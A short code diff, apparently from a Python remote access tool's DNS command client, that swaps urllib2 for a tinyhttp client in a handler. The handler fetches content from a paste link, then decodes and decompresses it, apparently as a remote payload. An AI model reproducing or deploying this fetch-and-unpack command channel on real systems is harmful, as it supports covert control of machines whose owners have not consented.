@@ -22,6 +22,7 @@ from ecpv import ECPV
 from picocmd import *
 
 from threading import Thread, Lock
+from network.lib import tinyhttp
 
 class TCPFile(StringIO.StringIO):
     pass
@@ -238,12 +239,10 @@ class DnsCommandsClient(Thread):
         return response.commands
 
     def on_pastelink(self, url, action, encoder):
-        proxy = urllib2.ProxyHandler()
-        opener = urllib2.build_opener(proxy)
-        response = opener.open(url)
-        if response.code == 200:
+        http = tinyhttp.HTTP(follow_redirects=True)
+        content, code = http.get(url, code=True)
+        if code == 200:
             try:
-                content = response.read()
                 content = ascii85.ascii85DecodeDG(content)
                 content = self.encoder.unpack(content)
                 content = zlib.decompress(content)
